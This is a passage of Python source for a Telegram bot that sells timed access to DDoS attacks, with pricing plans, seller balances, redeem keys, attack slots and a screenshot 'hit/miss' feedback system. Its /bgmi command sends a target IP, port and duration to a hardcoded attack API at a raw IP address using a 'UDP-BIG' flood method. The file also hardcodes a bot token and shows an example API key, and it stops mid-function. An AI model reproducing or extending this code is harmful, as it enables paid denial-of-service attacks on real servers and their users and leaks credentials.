#!/usr/bin/env python3
"""
LIGHTNING SERVER ATTACK BOT - 4 SLOTS
✅ Different users can attack simultaneously
✅ Same user = 1 attack at a time - WORKS IN GROUPS TOO
✅ Thread-safe slot reservation
✅ API key/URL HIDDEN — only owner can view/set/remove
✅ Owner can set slots, cooldown, max time
✅ Private attack notifications (no user info shown to others)
✅ HIT ✅ / MISS ❌ BUTTONS after attack
✅ 2 MINUTES to give feedback → else 10 MIN COOLDOWN
✅ SCREENSHOT FEEDBACK — only attacker's own screenshot accepted
✅ Feedback auto-forwarded to channel
✅ Feedback compulsory for users/sellers only - NOT for Admin/Owner
✅ Seller uses NORMAL USER RATES
✅ Sellers can only delete THEIR OWN generated keys
✅ Admin & Owner can add/remove sellers
✅ ONLY OWNER can add/remove admins
✅ Admin key delete = REVOKES user access SILENTLY
✅ /allusers shows ALL bot users (Admin/Owner only)
Run: python LIGHTNING_SERVER_bot.py
"""

import telebot
from telebot import types
import datetime
import os
import time
import threading
import json
import re
import requests
import secrets
import string
from http.server import BaseHTTPRequestHandler, HTTPServer

# ==================== CONFIG (HARDCODED) ====================
BOT_TOKEN = "8325498319:AAGaV1q0S6V0GEiNRMYOSgHD870lldY79Fw"
OWNER_ID = "6321758394"

# ==================== 🔒 FIXED API ENDPOINT (HIDDEN) ====================
_API_ENDPOINT_INTERNAL = "http://176.100.37.127:3001/api/v1/attack/start"
_API_METHOD_INTERNAL   = "UDP-BIG"

# ==================== SLOTS ====================
DEFAULT_TOTAL_SLOTS = 4

# ==================== FEEDBACK TIMING ====================
FEEDBACK_WINDOW_SECONDS = 120     # 2 minutes to give feedback
FEEDBACK_COOLDOWN_SECONDS = 600   # 10 minutes cooldown if missed

# ==================== FILES ====================
_BASE_DIR = os.path.dirname(os.path.abspath(__file__))
USER_FILE = os.path.join(_BASE_DIR, "users.txt")
LOG_FILE = os.path.join(_BASE_DIR, "log.txt")
STATE_FILE = os.path.join(_BASE_DIR, "bot_state.json")
PORT = int(os.environ.get("PORT", "8080"))

# ==================== PRICING (Seller = User rates) ====================
SELLER_PRICES = {
    "6hr":   {"cost": 50,   "display": "6 Hours"},
    "1day":  {"cost": 80,   "display": "1 Day"},
    "3days": {"cost": 200,  "display": "3 Days"},
    "7days": {"cost": 400,  "display": "7 Days"},
    "30days":{"cost": 700,  "display": "30 Days"},
    "60days":{"cost": 1000, "display": "60 Days"}
}

USER_PRICES = {
    "6hr": "50 Rs", "1day": "80 Rs", "3days": "200 Rs",
    "7days": "400 Rs", "30days": "700 Rs", "60days": "1000 Rs"
}

# ==================== STATE ====================
state = {
    "users": {},
    "admins": [],
    "sellers": [],
    "resellers": [],
    "owners": [OWNER_ID],
    "groups": [],
    "redeem_keys": {},
    "attack_slots": [],
    "attack_history": [],
    "api_config": {"key": ""},
    "settings": {
        "total_slots": DEFAULT_TOTAL_SLOTS,
        "cooldown": 0,
        "max_time": 300,
        "feedback_channel": ""
    }
}

def load_state():
    global state
    try:
        with open(STATE_FILE, "r") as f:
            loaded = json.load(f)
            if isinstance(loaded, dict):
                state = loaded
    except:
        pass
    
    state.setdefault("users", {})
    state.setdefault("admins", [])
    state.setdefault("sellers", [])
    state.setdefault("resellers", [])
    state.setdefault("owners", [OWNER_ID])
    state.setdefault("groups", [])
    state.setdefault("redeem_keys", {})
    state.setdefault("attack_slots", [])
    state.setdefault("attack_history", [])
    state.setdefault("api_config", {})
    if "key" not in state["api_config"]:
        state["api_config"]["key"] = ""
    if "settings" not in state:
        state["settings"] = {"total_slots": DEFAULT_TOTAL_SLOTS, "cooldown": 0, "max_time": 300, "feedback_channel": ""}
    if "total_slots" not in state["settings"]:
        state["settings"]["total_slots"] = DEFAULT_TOTAL_SLOTS
    if "cooldown" not in state["settings"]:
        state["settings"]["cooldown"] = 0
    if "max_time" not in state["settings"]:
        state["settings"]["max_time"] = 300
    if "feedback_channel" not in state["settings"]:
        state["settings"]["feedback_channel"] = ""

    if OWNER_ID not in state["owners"]:
        state["owners"].append(OWNER_ID)

    for r in state.get("resellers", []):
        if r not in state["sellers"]:
            state["sellers"].append(r)

    current_total = state["settings"]["total_slots"]
    if not state["attack_slots"]:
        state["attack_slots"] = [None] * current_total
    elif len(state["attack_slots"]) < current_total:
        while len(state["attack_slots"]) < current_total:
            state["attack_slots"].append(None)
    elif len(state["attack_slots"]) > current_total:
        state["attack_slots"] = state["attack_slots"][:current_total]

    save_state()

def save_state():
    try:
        with open(STATE_FILE, "w") as f:
            json.dump(state, f)
    except:
        pass

def now():
    return time.time()

def get_total_slots():
    return state["settings"].get("total_slots", DEFAULT_TOTAL_SLOTS)

def get_cooldown():
    return state["settings"].get("cooldown", 0)

def get_max_time():
    return state["settings"].get("max_time", 300)

def get_feedback_channel():
    return state["settings"].get("feedback_channel", "")

def is_owner(uid):
    return str(uid) in state.get("owners", []) or str(uid) == OWNER_ID

def is_admin(uid):
    return str(uid) in state.get("admins", []) or str(uid) == OWNER_ID

def is_seller(uid):
    return str(uid) in state.get("sellers", []) or str(uid) in state.get("resellers", [])

def is_reseller(uid):
    return is_seller(uid)

def is_authorized(uid):
    return is_admin(uid) or is_seller(uid) or is_owner(uid)

def is_group_allowed(group_id):
    return str(group_id) in state.get("groups", [])

def get_uid(message):
    if message.from_user is not None:
        return str(message.from_user.id)
    return str(message.chat.id)

def get_user(uid):
    return state["users"].get(str(uid))

def user_approved(uid):
    u = get_user(uid)
    if not u or not u.get("approved"):
        return False
    if u.get("expires", 0) < now():
        return False
    return True

def get_seller_balance(uid):
    user = state["users"].get(str(uid))
    return user.get("balance", 0) if user else 0

def set_seller_balance(uid, amount):
    uid = str(uid)
    if uid not in state["users"]:
        state["users"][uid] = {}
    state["users"][uid]["balance"] = amount
    save_state()

def add_seller_balance(uid, amount):
    uid = str(uid)
    current = get_seller_balance(uid)
    set_seller_balance(uid, current + amount)
    return current + amount

def deduct_seller_balance(uid, amount):
    uid = str(uid)
    current = get_seller_balance(uid)
    if current < amount:
        return False, current
    set_seller_balance(uid, current - amount)
    return True, current - amount

get_reseller_balance = get_seller_balance
set_reseller_balance = set_seller_balance
add_reseller_balance = add_seller_balance
deduct_reseller_balance = deduct_seller_balance

def generate_key(duration, duration_type, generated_by=None):
    key = ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(16))
    if duration_type == "hr":
        expiry = now() + (duration * 3600)
    elif duration_type == "day":
        expiry = now() + (duration * 86400)
    else:
        return None
    state["redeem_keys"][key] = {
        "duration": f"{duration}{duration_type}",
        "expires": expiry,
        "used": False,
        "used_by": None,
        "generated_by": str(generated_by) if generated_by else None,
        "generated_at": now()
    }
    save_state()
    return key

def redeem_key(user_id, key):
    if key not in state["redeem_keys"]:
        return False, "❌ Invalid key"
    key_data = state["redeem_keys"][key]
    if key_data.get("used", False):
        return False, "❌ Key already used"
    if key_data.get("expires", 0) < now():
        return False, "❌ Key expired"
    key_data["used"] = True
    key_data["used_by"] = str(user_id)
    key_data["redeemed_at"] = now()
    save_state()
    if str(user_id) not in state["users"]:
        state["users"][str(user_id)] = {}
    state["users"][str(user_id)]["approved"] = True
    state["users"][str(user_id)]["expires"] = key_data["expires"]
    state["users"][str(user_id)]["plan"] = key_data["duration"]
    state["users"][str(user_id)]["key_used"] = key
    state["users"][str(user_id)]["redeemed_at"] = now()
    save_state()
    with open(USER_FILE, "a") as f:
        f.write(f"{user_id}\n")
    expiry_time = datetime.datetime.fromtimestamp(key_data["expires"]).strftime('%Y-%m-%d %H:%M:%S')
    return True, f"✅ Key redeemed! Access until: {expiry_time}"

def revoke_user_access(user_id):
    uid = str(user_id)
    if uid in state["users"]:
        state["users"][uid]["approved"] = False
        state["users"][uid]["expires"] = 0
        state["users"][uid]["plan"] = "revoked"
        state["users"][uid]["key_used"] = None
        state["users"][uid]["redeemed_at"] = None
        save_state()
        return True
    return False

def clean_expired_keys():
    current_time = now()
    expired_keys = [k for k, d in state["redeem_keys"].items() if d.get("expires", 0) < current_time and not d.get("used", False)]
    if expired_keys:
        for k in expired_keys:
            del state["redeem_keys"][k]
        save_state()
        print(f"🧹 Cleaned {len(expired_keys)} expired keys")
    return len(expired_keys)

# ==================== FEEDBACK SYSTEM ====================

def user_needs_feedback(user_id):
    user = state["users"].get(str(user_id), {})
    
    cooldown_until = user.get("feedback_cooldown_until", 0)
    if cooldown_until > now():
        remaining = int(cooldown_until - now())
        return False, remaining, True
    elif cooldown_until > 0:
        user["feedback_cooldown_until"] = 0
        save_state()
    
    if not user.get("feedback_pending"):
        return False, 0, False
    
    pending_since = user.get("feedback_pending_since", 0)
    elapsed = now() - pending_since
    
    if elapsed >= FEEDBACK_WINDOW_SECONDS:
        user["feedback_pending"] = False
        user["feedback_pending_since"] = 0
        user["feedback_cooldown_until"] = now() + FEEDBACK_COOLDOWN_SECONDS
        save_state()
        return False, FEEDBACK_COOLDOWN_SECONDS, True
    
    remaining = int(FEEDBACK_WINDOW_SECONDS - elapsed)
    return True, remaining, False

def mark_feedback_pending(user_id, target, port, duration, chat_id=None):
    uid = str(user_id)
    if uid not in state["users"]:
        state["users"][uid] = {}
    state["users"][uid]["feedback_pending"] = True
    state["users"][uid]["feedback_pending_since"] = now()
    state["users"][uid]["feedback_chat_id"] = str(chat_id) if chat_id else None
    state["users"][uid]["last_attack_info"] = {
        "target": target, "port": port, "duration": duration, "time": now()
    }
    save_state()

def submit_screenshot_feedback(user_id, file_id, username, attack_info, hit_miss=None):
    uid = str(user_id)
    if uid not in state["users"]:
        state["users"][uid] = {}
    state["users"][uid]["feedback_pending"] = False
    state["users"][uid]["feedback_pending_since"] = 0
    state["users"][uid]["feedback_chat_id"] = None
    state["users"][uid]["feedback_cooldown_until"] = 0
    state["users"][uid]["last_feedback"] = {
        "type": "screenshot",
        "file_id": file_id,
        "hit_miss": hit_miss,
        "time": now()
    }
    save_state()
    send_screenshot_to_channel(user_id, username, file_id, attack_info, hit_miss)
    return True

def send_screenshot_to_channel(user_id, username, file_id, attack_info, hit_miss=None):
    channel = get_feedback_channel()
    if not channel:
        return False
    try:
        hit_miss_line = ""
        if hit_miss == "hit":
            hit_miss_line = "\n✅ Result: **HIT**"
        elif hit_miss == "miss":
            hit_miss_line = "\n❌ Result: **MISS**"
        
        caption = f"""📸 **NEW FEEDBACK SCREENSHOT**

👤 User: {username}
🆔 ID: `{user_id}`{hit_miss_line}

🎯 Last Attack:
• Target: `{attack_info.get('target', 'N/A')}`
• Port: `{attack_info.get('port', 'N/A')}`
• Duration: `{attack_info.get('duration', 'N/A')}s`

🕐 Time: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"""
        bot.send_photo(channel, file_id, caption=caption, parse_mode='Markdown')
        return True
    except Exception as e:
        print(f"Failed to send screenshot to channel: {e}")
        return False

def send_hit_miss_to_channel(user_id, username, hit_miss, attack_info):
    channel = get_feedback_channel()
    if not channel:
        return False
    try:
        emoji = "✅" if hit_miss == "hit" else "❌"
        label = "HIT" if hit_miss == "hit" else "MISS"
        text = f"""{emoji} **FEEDBACK: {label}**

👤 User: {username}
🆔 ID: `{user_id}`

🎯 Last Attack:
• Target: `{attack_info.get('target', 'N/A')}`
• Port: `{attack_info.get('port', 'N/A')}`
• Duration: `{attack_info.get('duration', 'N/A')}s`

📸 Waiting for screenshot...

🕐 Time: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"""
        bot.send_message(channel, text, parse_mode='Markdown')
        return True
    except Exception as e:
        print(f"Failed to send hit/miss to channel: {e}")
        return False

# ==================== SLOT MANAGEMENT ====================

def get_available_slot():
    for i, slot in enumerate(state["attack_slots"]):
        if slot is None:
            return i
    return -1

def get_user_attack_slot(user_id):
    for slot in state["attack_slots"]:
        if slot is not None and slot.get('user_id') == user_id and slot.get('status') == 'running':
            return slot
    return None

def get_active_attack_count():
    return sum(1 for s in state["attack_slots"] if s is not None and s.get('status') == 'running')

def get_active_users_details():
    details = []
    for i, slot in enumerate(state["attack_slots"]):
        if slot is not None and slot.get('status') == 'running':
            username = slot.get('username', slot.get('user_id', 'Unknown'))
            remaining = int(slot.get('expires', 0) - now())
            details.append(f"Slot {i+1}: {username} ({remaining}s left)")
    return "\n".join(details) if details else "No active attacks"

def clean_stuck_attacks():
    current_time = now()
    cleaned = 0
    for i, slot in enumerate(state["attack_slots"]):
        if slot is not None and slot.get('status') == 'running':
            if slot.get('expires', 0) < current_time:
                state["attack_slots"][i] = None
                cleaned += 1
    if cleaned > 0:
        save_state()
    return cleaned

attack_lock = threading.RLock()

def remove_attack_from_slot(user_id, slot_index=None):
    with attack_lock:
        for i, slot in enumerate(state["attack_slots"]):
            if slot is not None and slot.get('user_id') == user_id and slot.get('status') == 'running':
                if slot_index is not None and i != slot_index:
                    continue
                state["attack_slots"][i] = None
                save_state()
                return True
    return False

def reserve_attack_slot(user_id, target, port, duration, username, is_admin_user, is_owner_user):
    with attack_lock:
        clean_stuck_attacks()
        total_slots = get_total_slots()

        if not is_owner_user:
            existing = get_user_attack_slot(user_id)
            if existing is not None:
                if existing.get('expires', 0) > now():
                    return existing, "RUNNING"
                remove_attack_from_slot(user_id)

        slot_index = get_available_slot()
        if slot_index == -1:
            if is_owner_user:
                slot_index = 0
                if state["attack_slots"][0] is not None:
                    state["attack_slots"][0] = None
            else:
                return None, "FULL"

        attack_data = {
            "user_id": user_id, "ip": target, "port": port, "duration": duration,
            "expires": now() + duration + 5, "username": username,
            "start_time": datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            "is_admin": is_admin_user, "is_owner": is_owner_user,
            "status": "running", "slot": slot_index
        }
        state["attack_slots"][slot_index] = attack_data
        save_state()
        return attack_data, "OK"

# ==================== BOT SETUP ====================
bot = telebot.TeleBot(BOT_TOKEN)

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        with open(USER_FILE, "w") as file:
            file.write("")
        return []

allowed_user_ids = read_users()

def log_command(user_id, target, port, time_sec):
    try:
        user_info = bot.get_chat(int(user_id))
        username = f"@{user_info.username}" if user_info.username else f"ID:{user_id}"
    except:
        username = f"ID:{user_id}"
    with open(LOG_FILE, "a") as file:
        file.write(f"[{datetime.datetime.now()}] {username} -> {target}:{port} | {time_sec}s\n")

# ==================== API FUNCTIONS ====================
def _get_api_key():
    cfg = state.get("api_config", {}) or {}
    return (cfg.get("key") or "").strip()

def build_attack_url(ip, port, duration):
    api_key = _get_api_key()
    if not api_key:
        return None, "NOT_SET"
    url = (
        f"{_API_ENDPOINT_INTERNAL}"
        f"?key={api_key}&ip={ip}&port={port}&time={duration}&method={_API_METHOD_INTERNAL}"
    )
    return url, None

def start_attack(ip, port, duration):
    try:
        url, err = build_attack_url(ip, port, duration)
        if err:
            return {"success": False, "error": "API_NOT_CONFIGURED"}
        response = requests.get(url, timeout=15)
        try:
            return response.json()
        except:
            return {"success": False, "error": "Invalid response from gateway"}
    except Exception as e:
        return {"success": False, "error": "Network error"}

def sanitize_error(err_msg):
    if not err_msg:
        return "Unknown error"
    err_str = str(err_msg)
    err_str = re.sub(r'https?://\S+', '[hidden]', err_str)
    err_str = re.sub(r'(key=)[^\s&]+', r'\1[hidden]', err_str)
    err_str = re.sub(r'nk_[A-Za-z0-9]+', '[hidden]', err_str)
    return err_str

# ==================== DECORATORS ====================

def owner_only(func):
    def wrapper(message):
        if not is_owner(get_uid(message)):
            bot.reply_to(message, "❌ Owner only command.")
            return
        return func(message)
    return wrapper

def admin_only(func):
    def wrapper(message):
        if not is_admin(get_uid(message)):
            bot.reply_to(message, "❌ Admin only command.")
            return
        return func(message)
    return wrapper

def authorized_only(func):
    def wrapper(message):
        if not is_authorized(get_uid(message)):
            bot.reply_to(message, "❌ Only Admin/Seller can use this command.")
            return
        return func(message)
    return wrapper

def check_access(func):
    def wrapper(message):
        user_id = get_uid(message)
        chat_id = str(message.chat.id)
        is_group = message.chat.type in ['group', 'supergroup']

        if is_admin(user_id):
            return func(message)

        if is_seller(user_id):
            if user_approved(user_id):
                return func(message)
            else:
                bot.reply_to(message, "❌ No Active Key Found!\n\nAs a seller, generate a key for yourself:\n/generate 1day\nThen redeem it:\n/redeem <key>")
                return

        if user_approved(user_id):
            return func(message)

        if is_group and is_group_allowed(chat_id):
            return func(message)

        bot.reply_to(message, "❌ Access Denied!\nUse /redeem <key> to activate.\n\nContact your respective seller to purchase keys.")
        return
    return wrapper

# ==================== TIMER ====================

def update_timer(chat_id, msg_id, target, port, duration, is_admin_user, is_owner_user, user_id, slot_index):
    try:
        elapsed = 0
        last_update = 0
        total_slots = get_total_slots()
        while elapsed < duration:
            time.sleep(2)
            elapsed += 2
            if elapsed - last_update < 5 and elapsed < duration:
                continue
            last_update = elapsed
            remaining = duration - elapsed
            if remaining <= 0:
                break
            finish_time = (datetime.datetime.now() + datetime.timedelta(seconds=remaining)).strftime('%H:%M:%S')
            bar_length = 20
            filled = int((elapsed / duration) * bar_length)
            bar = "█" * filled + "░" * (bar_length - filled)
            clean_stuck_attacks()

            if is_owner_user:
                admin_tag = " 👑 OWNER"
            elif is_admin_user:
                admin_tag = " 👑 ADMIN"
            else:
                admin_tag = ""

            timer_text = f"""⚡ ATTACK IN PROGRESS!{admin_tag}

🎯 Target: {target}:{port}
⏱ Elapsed: {elapsed}s / {duration}s
⏳ Remaining: {remaining}s
📊 Progress: [{bar}] {int((elapsed/duration)*100)}%

⌛ Finishes: {finish_time}
📌 Your Slot: {slot_index + 1}/{total_slots}

🔥 LIGHTNING SERVER ULTIMATE POWER"""
            try:
                bot.edit_message_text(timer_text, chat_id, msg_id)
            except Exception as e:
                print(f"Timer update error: {e}")
                break
    except Exception as e:
        print(f"Timer thread error: {e}")
    finally:
        try:
            remove_attack_from_slot(user_id, slot_index)
        except:
            pass

# ==================== HEALTH SERVER ====================
class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"LIGHTNING SERVER Bot is running!")

def start_health_server():
    try:
        server = HTTPServer(("0.0.0.0", PORT), HealthHandler)
        server.serve_forever()
    except:
        pass

# ==================== HIT/MISS BUTTON CALLBACK ====================

@bot.callback_query_handler(func=lambda call: call.data.startswith("fb_"))
def handle_hit_miss_callback(call):
    try:
        user_id = str(call.from_user.id)
        chat_id = call.message.chat.id
        
        parts = call.data.split("_")
        if len(parts) != 3:
            bot.answer_callback_query(call.id, "❌ Invalid button")
            return
        
        action = parts[1]
        attacker_id = parts[2]
        
        if user_id != attacker_id:
            bot.answer_callback_query(call.id, "❌ This is not your feedback button!", show_alert=True)
            return
        
        needs_fb, remaining, is_cooldown = user_needs_feedback(user_id)
        
        if is_cooldown:
            bot.answer_callback_query(call.id, f"⏱ Cooldown active! Wait {remaining}s", show_alert=True)
            return
        
        if not needs_fb:
            bot.answer_callback_query(call.id, "ℹ️ No pending feedback", show_alert=True)
            return
        
        try:
            user_info = bot.get_chat(int(user_id))
            username = f"@{user_info.username}" if user_info.username else f"ID:{user_id}"
        except:
            username = f"ID:{user_id}"
        
        user_data = state["users"].get(user_id, {})
        attack_info = user_data.get("last_attack_info", {})
        
        send_hit_miss_to_channel(user_id, username, action, attack_info)
        
        if user_id not in state["users"]:
            state["users"][user_id] = {}
        state["users"][user_id]["feedback_hit_miss"] = action
        save_state()
        
        emoji = "✅" if action == "hit" else "❌"
        label = "HIT" if action == "hit" else "MISS"
        
        bot.answer_callback_query(call.id, f"{emoji} {label} recorded!")
        
        try:
            confirmation = f"""{emoji} **{label} RECORDED!**

📸 **Now send the SCREENSHOT as a photo in this chat!**
→ Bot will auto-forward to admin
→ Then you can attack again

⏱ You have {remaining}s to send the screenshot!"""
            bot.send_message(chat_id, confirmation, parse_mode='Markdown')
        except:
            pass
        
        try:
            bot.edit_message_reply_markup(
                chat_id=chat_id,
                message_id=call.message.message_id,
                reply_markup=None
            )
        except:
            pass
        
    except Exception as e:
        print(f"Callback error: {e}")
        try:
            bot.answer_callback_query(call.id, "❌ Error occurred")
        except:
            pass

# ==================== SCREENSHOT HANDLER ====================

@bot.message_handler(content_types=['photo'])
def handle_screenshot_feedback(message):
    sender_id = get_uid(message)
    chat_id = str(message.chat.id)
    is_group = message.chat.type in ['group', 'supergroup']
    
    try:
        sender_info = bot.get_chat(int(sender_id))
        sender_name = f"@{sender_info.username}" if sender_info.username else f"ID:{sender_id}"
    except:
        sender_name = f"ID:{sender_id}"
    
    needs_fb, remaining, is_cooldown = user_needs_feedback(sender_id)
    
    if is_cooldown:
        if not is_group:
            bot.reply_to(message, f"⏱ You are on cooldown! Wait {remaining}s before attacking again.")
        return
    
    if not needs_fb:
        if is_admin(sender_id) or is_owner(sender_id):
            if not is_group:
                bot.reply_to(message, "ℹ️ Screenshot received. (Admins/Owners don't need to send feedback)")
            return
        if is_group:
            return
        bot.reply_to(message, "ℹ️ No pending feedback required for you.\n\nYou only need to send screenshot after YOU launch an attack.")
        return
    
    pending_chat = state["users"].get(str(sender_id), {}).get("feedback_chat_id")
    if pending_chat and is_group and pending_chat != chat_id:
        bot.reply_to(message, "⚠️ Send your screenshot in the SAME chat where you launched the attack.")
        return
    
    file_id = message.photo[-1].file_id
    user_data = state["users"].get(str(sender_id), {})
    attack_info = user_data.get("last_attack_info", {})
    hit_miss = user_data.get("feedback_hit_miss", None)
    
    submit_screenshot_feedback(sender_id, file_id, sender_name, attack_info, hit_miss)
    
    if is_group:
        try:
            bot.reply_to(
                message,
                f"✅ Feedback accepted for [{sender_name}](tg://user?id={sender_id})!\n\n"
                f"📸 Screenshot forwarded to admin.\n"
                f"📌 You can now attack again!",
                parse_mode='Markdown'
            )
        except:
            bot.reply_to(message, "✅ Feedback accepted! You can attack again.")
    else:
        bot.reply_to(message, """✅ **FEEDBACK ACCEPTED!**

📸 Your screenshot has been received.
📤 Forwarded to admin channel.
📌 You can now attack again!

🔥 LIGHTNING SERVER""", parse_mode='Markdown')

# ==================== FEEDBACK TIMEOUT WATCHER ====================

def feedback_timeout_watcher():
    while True:
        try:
            time.sleep(10)
            current = now()
            
            for uid, user in list(state["users"].items()):
                if not user.get("feedback_pending"):
                    continue
                
                pending_since = user.get("feedback_pending_since", 0)
                elapsed = current - pending_since
                
                if elapsed >= FEEDBACK_WINDOW_SECONDS:
                    user["feedback_pending"] = False
                    user["feedback_pending_since"] = 0
                    user["feedback_cooldown_until"] = current + FEEDBACK_COOLDOWN_SECONDS
                    save_state()
                    
                    chat_id = user.get("feedback_chat_id")
                    if chat_id:
                        try:
                            bot.send_message(
                                chat_id,
                                f"""⏱ **FEEDBACK TIMEOUT!**

❌ You did not send feedback within 2 minutes!

🚫 **10 MINUTE COOLDOWN ACTIVATED**
You can attack again after 10 minutes.

📌 Next time, send your screenshot immediately!""",
                                parse_mode='Markdown'
                            )
                        except:
                            pass
        except Exception as e:
            print(f"Feedback watcher error: {e}")

# ==================== /START ====================

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_id = get_uid(message)
    user_name = message.from_user.first_name if message.from_user else user_id
    is_approved = user_approved(user_id) or is_admin(user_id)

    if is_owner(user_id):
        total_slots = get_total_slots()
        max_time = get_max_time()
        cooldown = get_cooldown()
        response = f"""🌟 Welcome to LIGHTNING SERVER BOT {user_name}! 👑 OWNER

⚡ The Ultimate Attack Solution

✅ Status: Owner Access ✅
⚔️ Attacks: Unlimited
📸 Feedback: Not Required

💥 Commands:
/bgmi <ip> <port> <time> - Launch attack
/status - Check your attack status
/redeem <key> - Activate your access
/plan - View pricing plans
/help - Full guide

👑 Owner Commands:
/ownerpanel - Full control panel
/setslot <number> - Set total slots (current: {total_slots})
/setcooldown <seconds> - Set cooldown (current: {cooldown}s)
/setmaxtime <seconds> - Set max attack time (current: {max_time}s)
/setfeedbackchannel <channel_id> - Set feedback channel
/addapikey <key> - Set API key 🔒
/removeapikey - Remove API key 🔒
/viewapikey - View API status 🔒
/addadmin <id> - Add admin (Owner only)
/removeadmin <id> - Remove admin (Owner only)
/addseller <id> <coins> - Add seller
/removeseller <id> - Remove seller
/sellerlist - List all sellers
/addgroup <group_id> - Add group access
/removegroup <group_id> - Remove group access
/groups - List allowed groups
/deletekey <key> - Delete any key (REVOKES access!)
/cleankeys - Remove all expired keys

🔥 LIGHTNING SERVER POWER!"""
    elif is_admin(user_id):
        response = f"""🌟 Welcome to LIGHTNING SERVER BOT {user_name}! 👑 ADMIN

⚡ The Ultimate Attack Solution

✅ Status: Admin Access ✅
📸 Feedback: Not Required

💥 Commands:
/bgmi <ip> <port> <time> - Launch attack
/status - Check your attack status
/redeem <key> - Activate your access
/plan - View pricing plans
/help - Full guide

👑 Admin Commands:
/generate 6hr/1day/3days/7days/30days/60days - Generate key
/add <user_id> - Add user
/remove <user_id> - Remove user
/addseller <id> <coins> - Add seller
/removeseller <id> - Remove seller
/sellerlist - List all sellers
/addbalance <id> <amount> - Add seller balance
/sellerbalance <id> - Check seller balance
/allusers - List ALL bot users
/activeattacks - See active attacks
/userinfo <id> - Get user details
/keyinfo <key> - Get key details
/deletekey <key> - Delete key (REVOKES access!)

⚠️ Note: You CANNOT remove Admins (Owner only)"""
    elif is_seller(user_id):
        balance = get_seller_balance(user_id)
        response = f"""🌟 Welcome to LIGHTNING SERVER BOT {user_name}! 🛒 SELLER

💰 Balance: {balance} coins

💥 Commands:
/bgmi <ip> <port> <time> - Launch attack
/status - Check your attack status
/redeem <key> - Activate your access
/plan - View pricing plans
/help - Full guide

🛒 Seller Commands:
/generate 6hr/1day/3days/7days/30days/60days - Generate key
/balance - Check your coin balance
/keyslist - Show your generated keys
/deletekey <key> - Delete YOUR generated key only"""
    else:
        response = f"""🌟 Welcome to LIGHTNING SERVER BOT {user_name}!

⚡ The Ultimate Attack Solution

✅ Status: {'✅ Active' if is_approved else '❌ Inactive'}

💥 Commands:
/bgmi <ip> <port> <time> - Launch attack
/status - Check your attack status
/redeem <key> - Activate your access
/plan - View pricing plans
/help - Full guide

📸 **After attack:**
1. Click ✅ Hit or ❌ Miss
2. Send screenshot within 2 minutes
3. Attack again!"""
    bot.reply_to(message, response)

# ==================== OWNER SETTINGS ====================

@bot.message_handler(commands=['setslot'])
@owner_only
def set_slot_command(message):
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, f"❌ Usage: /setslot <number>\n\nCurrent slots: {get_total_slots()}\nExample: /setslot 4")
        return
    try:
        new_slots = int(command[1])
    except ValueError:
        bot.reply_to(message, "❌ Invalid number.")
        return
    if new_slots < 1 or new_slots > 50:
        bot.reply_to(message, "❌ Slots must be between 1 and 50.")
        return

    old_total = get_total_slots()
    state["settings"]["total_slots"] = new_slots
    if len(state["attack_slots"]) < new_slots:
        while len(state["attack_slots"]) < new_slots:
            state["attack_slots"].append(None)
    elif len(state["attack_slots"]) > new_slots:
        state["attack_slots"] = state["attack_slots"][:new_slots]
    save_state()

    bot.reply_to(message, f"""✅ **Slots Updated!**

📊 Old: `{old_total}`
📊 New: `{new_slots}`

📌 Total slots now: **{new_slots}**""", parse_mode='Markdown')

@bot.message_handler(commands=['setcooldown'])
@owner_only
def set_cooldown_command(message):
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, f"❌ Usage: /setcooldown <seconds>\n\nCurrent: {get_cooldown()}s\nExample: /setcooldown 30")
        return
    try:
        new_cd = int(command[1])
    except ValueError:
        bot.reply_to(message, "❌ Invalid number.")
        return
    if new_cd < 0 or new_cd > 3600:
        bot.reply_to(message, "❌ Cooldown must be 0-3600 seconds.")
        return
    state["settings"]["cooldown"] = new_cd
    save_state()
    bot.reply_to(message, f"""✅ **Cooldown Updated!**

⏱ New Cooldown: `{new_cd}` seconds

📌 Users must wait {new_cd}s between attacks.""", parse_mode='Markdown')

@bot.message_handler(commands=['setmaxtime'])
@owner_only
def set_maxtime_command(message):
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, f"❌ Usage: /setmaxtime <seconds>\n\nCurrent: {get_max_time()}s\nExample: /setmaxtime 300")
        return
    try:
        new_max = int(command[1])
    except ValueError:
        bot.reply_to(message, "❌ Invalid number.")
        return
    if new_max < 10 or new_max > 3600:
        bot.reply_to(message, "❌ Max time must be 10-3600 seconds.")
        return
    state["settings"]["max_time"] = new_max
    save_state()
    bot.reply_to(message, f"""✅ **Max Time Updated!**

⏱ New Max: `{new_max}` seconds

📌 Users can now attack up to {new_max}s.""", parse_mode='Markdown')

@bot.message_handler(commands=['setfeedbackchannel'])
@owner_only
def set_feedback_channel_command(message):
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, f"""❌ Usage: /setfeedbackchannel <channel_id>

Current: {get_feedback_channel() or 'Not Set'}

Example: /setfeedbackchannel -1001234567890

📌 Bot must be admin in the channel!""")
        return
    channel_id = command[1].strip()
    state["settings"]["feedback_channel"] = channel_id
    save_state()
    bot.reply_to(message, f"✅ Feedback channel set to: `{channel_id}`", parse_mode='Markdown')

# ==================== API COMMANDS (OWNER ONLY) ====================

@bot.message_handler(commands=['addapikey'])
@owner_only
def add_api_key_command(message):
    command = message.text.split(maxsplit=1)
    if len(command) < 2:
        bot.reply_to(message, """❌ Usage: /addapikey <API_KEY>

Example:
/addapikey nk_5def97d0f20ab1b281fda0c6b1d378f2

📌 Just the key — endpoint is fixed inside the bot.
🔒 Only OWNER can use this command.""")
        return
    api_key = command[1].strip()
    if not api_key or len(api_key) < 6:
        bot.reply_to(message, "❌ Invalid API key.")
        return
    state["api_config"] = {"key": api_key}
    save_state()
    masked = api_key[:6] + "..." + api_key[-4:] if len(api_key) > 12 else "***"
    bot.reply_to(message, f"""✅ **API Key Saved!**

🔑 Key: `{masked}`
📊 Status: ✅ Ready""", parse_mode='Markdown')

@bot.message_handler(commands=['removeapikey'])
@owner_only
def remove_api_key_command(message):
